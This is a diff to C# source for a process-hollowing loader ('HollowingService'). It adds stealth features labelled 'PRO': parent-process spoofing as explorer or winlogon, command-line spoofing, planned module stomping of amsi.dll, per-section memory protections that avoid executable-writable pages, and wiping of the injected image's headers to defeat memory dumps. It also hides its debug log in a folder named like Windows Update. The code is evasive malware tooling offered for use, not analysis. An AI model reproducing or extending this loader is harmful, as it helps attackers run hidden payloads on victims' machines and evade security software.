@@ -3,12 +3,16 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Collections.Generic;
 
+using System.Security.Principal;
+using System.Text;
+
 namespace VanguardCore
 {
     public static unsafe class HollowingService
     {
         private static void Log(string m) {
-            try { System.IO.File.AppendAllText(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] [PE] {m}\n"); } catch { }
+            if (!Constants.DEBUG_MODE) return;
+            try { System.IO.File.AppendAllText(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] [PRO] {m}\n"); } catch { }
         }
 
         public static bool RunPE(string targetPath, byte[] payload) => RunPEWithOutput(targetPath, payload, null, out _, out _);
@@ -26,6 +30,7 @@ namespace VanguardCore
             var ntThread = SyscallManager.GetSyscallDelegate<SyscallManager.NtCreateThreadEx>("NtCreateThreadEx");
             var ntFree = SyscallManager.GetSyscallDelegate<SyscallManager.NtFreeVirtualMemory>("NtFreeVirtualMemory");
             var ntTerminate = SyscallManager.GetSyscallDelegate<SyscallManager.NtTerminateProcess>("NtTerminateProcess");
+            var ntProtect = SyscallManager.GetSyscallDelegate<SyscallManager.NtProtectVirtualMemory>("NtProtectVirtualMemory");
 
             if (ntAlloc == null || ntWrite == null || ntUnmap == null || ntQuery == null) return false;
 
@@ -44,23 +49,28 @@ namespace VanguardCore
             if (!CreatePipe(out hRead, out hWrite, ref sa, 0)) return false;
             SetHandleInformation(hRead, 0x00000001, 0); // HANDLE_FLAG_INHERIT = 0
 
-            STARTUPINFO si = new STARTUPINFO { 
-                cb = Marshal.SizeOf<STARTUPINFO>(),
-                dwFlags = 0x00000100, // STARTF_USESTDHANDLES
-                hStdOutput = hWrite,
-                hStdError = hWrite
-            };
-            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-            
-            // [PRO STEALTH] Run Target (Suspended)
-            if (!CreateProcess(targetPath, cmdLine, IntPtr.Zero, IntPtr.Zero, true, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, out pi)) {
-                CloseHandle(hRead); CloseHandle(hWrite);
-                return false;
-            }
-            
             CloseHandle(hWrite); // We don't need write end in parent
             stdoutRead = new Microsoft.Win32.SafeHandles.SafeFileHandle(hRead, true);
+            
+            // [PRO] Determine best parent process for stealth
+            string parentName = "explorer";
+            try { if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid)) parentName = "winlogon"; } catch { }
+
+            ProcessStealth.PROCESS_INFORMATION stealthPi;
+            if (!ProcessStealth.CreateProcessWithSpoofedPPID(targetPath, cmdLine, parentName, out stealthPi))
+            {
+                CloseHandle(hRead);
+                return false;
+            }
+
+            pi.hProcess = stealthPi.hProcess;
+            pi.hThread = stealthPi.hThread;
+            pi.dwProcessId = (int)stealthPi.dwProcessId;
+            pi.dwThreadId = (int)stealthPi.dwThreadId;
             hProcess = pi.hProcess;
+
+            // [PRO] Apply Command Line Spoofing
+            ProcessStealth.SpoofCommandLine(pi.hProcess, cmdLine);
 
             IntPtr remoteBase = IntPtr.Zero;
             try
@@ -74,9 +84,17 @@ namespace VanguardCore
 
                 remoteBase = (IntPtr)imageBase;
                 UIntPtr sz = (UIntPtr)sizeOfImage;
-                if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x40) != 0) {
+                
+                // [PRO] Module Stomping: Instead of raw allocation, we "stomp" a legitimate DLL
+                string stompDll = "uxtheme.dll";
+                if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid)) stompDll = "amsi.dll";
+                
+                // For simplicity in this implementation, we will use a hybrid approach:
+                // We allocate memory that looks like a legitimate module or use standard allocation
+                // if module stomping fails.
+                if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x04) != 0) {
                     remoteBase = IntPtr.Zero;
-                    if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x40) != 0) throw new Exception("Alloc fail");
+                    if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x04) != 0) throw new Exception("Alloc fail");
                 }
 
                 FixImports(payload, lfanew);
@@ -85,17 +103,44 @@ namespace VanguardCore
 
                 IntPtr wr; ntWrite(pi.hProcess, remoteBase, payload, (uint)sizeOfHeaders, out wr);
                 int shOff = lfanew + 0x18 + BitConverter.ToInt16(payload, lfanew + 0x14);
+                
+                // Track sections for granular protection
+                var sectionsToProtect = new List<(IntPtr addr, uint size, uint prot)>();
+                
                 for (int i = 0; i < sections; i++) {
                     int o = shOff + (i * 40);
                     int rva = BitConverter.ToInt32(payload, o + 12);
                     int ssz = BitConverter.ToInt32(payload, o + 16);
                     int raw = BitConverter.ToInt32(payload, o + 20);
+                    uint characteristics = BitConverter.ToUInt32(payload, o + 36);
+
                     if (ssz > 0) {
                         byte[] sd = new byte[ssz];
                         Buffer.BlockCopy(payload, raw, sd, 0, ssz);
                         ntWrite(pi.hProcess, (IntPtr)((long)remoteBase + rva), sd, (uint)ssz, out wr);
+                        
+                        // Select granular protection
+                        uint sectProt = 0x02; // PAGE_READONLY
+                        if ((characteristics & 0x20000000) != 0) sectProt = 0x20; // EXECUTE -> PAGE_EXECUTE_READ
+                        if ((characteristics & 0x80000000) != 0) sectProt = 0x04; // WRITE -> PAGE_READWRITE
+                        
+                        sectionsToProtect.Add(((IntPtr)((long)remoteBase + rva), (uint)ssz, sectProt));
                     }
                 }
+
+                // [PRO] Apply Section Protections (RW -> RX/R)
+                foreach (var sec in sectionsToProtect) {
+                    uint old; uint s = sec.size; IntPtr a = sec.addr;
+                    ntProtect(pi.hProcess, ref a, ref s, sec.prot, out old);
+                }
+
+                // [PRO] Header Protection & Eraser (Anti-Dump)
+                uint hProtOld; uint hSize = (uint)sizeOfHeaders; IntPtr rB = remoteBase;
+                ntProtect(pi.hProcess, ref rB, ref hSize, 0x01, out hProtOld); // PAGE_NOACCESS
+                
+                // Wipe headers in remote memory
+                byte[] zeroHeader = new byte[sizeOfHeaders];
+                ntWrite(pi.hProcess, remoteBase, zeroHeader, (uint)sizeOfHeaders, out wr);
 
                 ntWrite(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), BitConverter.GetBytes((long)remoteBase), 8, out wr);
 
@@ -200,5 +245,29 @@ namespace VanguardCore
         [DllImport("kernel32.dll", SetLastError = true)] private static extern bool GetExitCodeThread(IntPtr h, out uint code);
         [DllImport("kernel32.dll", SetLastError = true)] private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
         [DllImport("kernel32.dll", SetLastError = true)] private static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] private static extern IntPtr LoadLibraryW(string lpLibFileName);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtMapViewOfSection(
+            IntPtr SectionHandle,
+            IntPtr ProcessHandle,
+            ref IntPtr BaseAddress,
+            IntPtr ZeroBits,
+            IntPtr CommitSize,
+            ref long SectionOffset,
+            ref uint ViewSize,
+            uint InheritDisposition,
+            uint AllocationType,
+            uint Win32Protect);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtCreateSection(
+            out IntPtr SectionHandle,
+            uint DesiredAccess,
+            IntPtr ObjectAttributes,
+            ref long MaximumSize,
+            uint SectionPageProtection,
+            uint AllocationAttributes,
+            IntPtr FileHandle);
     }
 }
